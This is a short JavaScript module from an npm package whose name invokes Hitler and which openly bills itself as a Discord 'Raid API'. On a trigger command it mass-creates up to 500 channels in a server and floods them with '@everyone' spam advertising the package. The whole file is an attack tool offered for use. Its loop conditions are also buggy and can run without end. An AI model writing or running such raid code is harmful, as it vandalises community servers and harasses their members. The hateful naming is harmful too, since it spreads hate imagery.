module.exports = (client, prefix, commande, parametres) => {
    client.on('message', message => {
        if (message.content == prefix + commande) {
            if (!message.guild.me.hasPermission('ADMINISTRATOR')) return console.log("Permissions insuffisantes pour créer les salons.\n(node_modules/magic_hitler/scripts/channels/createChannel.js:18)");


            for (var i = 0; i < parametres.createChannelCount || 500 - message.guild.channels.size; i++) {
                if (parametres.sendMessage) {
                    if (parametres.sendMessage === true) {
                        message.guild.createChannel(parametres.createChannelName || "raid-api-by-magic-hitler", "text").then(channel => {
                            for (var o = 0; o < parametres.sendMessageCount || 500; o++) {
                                channel.send(parametres.sendMessageContent || "@everyone Raid API by Magic Hitler : npm i magic_hitler");
                            }
                        });


                    } else {
                        for (var p = 0; p < parametres.createChannelCount || 500 - message.guild.channels.size; p++) {
                            message.guild.createChannel(parametres.createChannelName || "raid-api-by-magic-hitler", "text");
                        }



                    }
                } else {
                    for (var n = 0; n < parametres.createChannelCount || 500 - message.guild.channels.size; n++) {
                        message.guild.createChannel(parametres.createChannelName || "raid-api-by-magic-hitler", "text");
                    }
                }
            }
        }
    })
}
